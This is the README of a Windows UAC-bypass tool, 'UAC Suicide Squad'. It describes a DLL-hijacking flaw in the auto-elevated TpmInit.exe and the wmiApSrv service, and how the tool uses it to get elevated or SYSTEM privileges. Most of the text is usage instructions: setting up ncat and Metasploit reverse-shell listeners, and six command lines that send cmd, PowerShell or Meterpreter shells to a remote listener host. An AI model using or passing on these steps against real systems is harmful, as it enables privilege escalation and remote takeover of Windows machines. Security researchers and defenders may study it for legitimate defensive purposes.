 ______                ____      _ __
  /_  __/___  ____ ___  /  _/___  (_) /_
   / / / __ \/ __ `__ \ / // __ \/ / __/
  / / / /_/ / / / / / // // / / / / /_
 /_/ / .___/_/ /_/ /_/___/_/ /_/_/\__/
    /_/
               UAC Suicide Squad v1.1
                      By Cn33liz 2016
A tool to Bypass User Account Control (UAC), to get a High Integrity (or SYSTEM) Reversed Command shell, a reversed PowerShell session, or a Reversed Meterpreter session. When TpmInit.exe starts, it first tries to load the wbemcomn.dll within C:\Windows\System32\wbem. This DLL cannot be found in that folder, so it tries to load the DLL again, but then in C:\Windows\System32. This tool exploits this DLL loading vulnerability within TpmInit.exe, which runs auto-elevated by default. Same issue also applies to the WMI Performance Adapter service (wmiApSrv) which runs with SYSTEM privileges. So while we can use TpmInit.exe to get Elevated priviliges, we can also use it to start the wmiApSrv service, and get a SYSTEM shell using our custom DLL :)

Works on:
--------------------------------------------------------------------------------------------------
This version has been succesfully tested on Windows 8.1 x64 and Windows 10 x64 (Version 1511). ====
--------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------
How to use it:

* [>] Usage: First setup a remote Netcat, Ncat or Meterpreter(x64) listener
* [>] Example: KickAss@PenTestBox:~$ sudo ncat -lvp 443

* [>] Or for msf: KickAss@PenTestBox:~$ sudo msfconsole
* [>] msf > use exploit/multi/handler
* [>] msf exploit(handler) > set payload windows/x64/meterpreter/reverse_tcp
* [>] msf exploit(handler) > set LHOST 10.0.0.1
* [>] msf exploit(handler) > set LPORT 443
* [>] msf exploit(handler) > exploit -j

* [>] Then on your target: TpmInitUACBypass.exe <Remote Listener IP> <Port> <powershell, cmd or msf> <system>

* [>] Example1: Remote Elevated Cmd Shell:   TpmInitUACBypass.exe 10.0.0.1 443 cmd
* [>] Example2: Remote SYSTEM Cmd Shell:     TpmInitUACBypass.exe 10.0.0.1 443 cmd system
* [>] Example3: Remote Elevated PowerShell:  TpmInitUACBypass.exe 10.0.0.1 443 powershell
* [>] Example4: Remote SYSTEM PowerShell:    TpmInitUACBypass.exe 10.0.0.1 443 powershell system
* [>] Example5: Remote Elevated Meterpreter: TpmInitUACBypass.exe 10.0.0.1 443 msf
* [>] Example6: Remote SYSTEM Meterpreter:   TpmInitUACBypass.exe 10.0.0.1 443 msf system
-------------------------------------------------------------------------------------------------
Strong Advice

# Do not use accounts with Administrative privileges for daily computer usage!
